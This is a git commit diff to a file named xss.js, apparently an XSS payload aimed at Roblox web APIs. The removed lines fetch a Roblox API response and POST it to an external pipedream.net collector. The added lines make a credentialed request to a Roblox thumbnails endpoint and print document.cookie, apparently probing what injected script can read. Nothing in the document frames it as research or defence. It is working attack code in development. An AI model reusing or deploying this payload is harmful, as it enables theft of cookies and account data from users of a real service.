e21a8490dc2d3357efa5c73a070186ebdcb92747
Ozgun <112448699+Ozgun101@users.noreply.github.com>
2025-02-20 00:25:55 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,8 +1,14 @@
-fetch("https://apis.roblox.com/universal-app-configuration/v1/behaviors/cookie-policy/content")
-  .then(res => res.text())
-  .then(html => fetch("https://eon32wucwm6yep3.m.pipedream.net/", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ html })
-  }))
-  .catch(console.error);)//',
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://thumbnails.roblox.com/v1/assets?assetIds=17569533757&format=jpeg&isCircular=false&size=150x150', true);
+xhr.withCredentials = true;
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+        var response = JSON.parse(xhr.responseText);
+        console.log(response);
+        console.log('Cookies sent with the response:');
+        console.log(document.cookie);
+    }
+};
+
+// Send the request
+xhr.send();
